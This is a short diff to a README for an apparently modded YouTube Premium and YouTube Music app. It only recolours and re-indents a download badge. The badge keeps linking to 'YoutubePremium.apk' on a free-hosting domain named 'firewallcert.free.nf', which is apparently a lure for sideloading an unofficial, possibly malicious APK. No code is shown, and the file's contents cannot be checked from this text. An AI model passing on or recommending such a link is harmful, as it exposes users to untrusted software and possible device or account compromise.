@@ -42,9 +42,9 @@ This project also includes **YouTube Music** support integrated in a single app.
 You can directly download the latest build from the link below:
 
 <p align="center">
-  <a href="http://firewallcert.free.nf/YoutubePremium.apk">
-  <img src="https://img.shields.io/badge/Download_Premium_APK-gold?style=for-the-badge&logo=youtube"/>
-  </a>
+ <a href="http://firewallcert.free.nf/YoutubePremium.apk">
+  <img src="https://img.shields.io/badge/Download_Premium_APK-red?style=for-the-badge&logo=youtube"/>
+</a>
 </p>
 
 
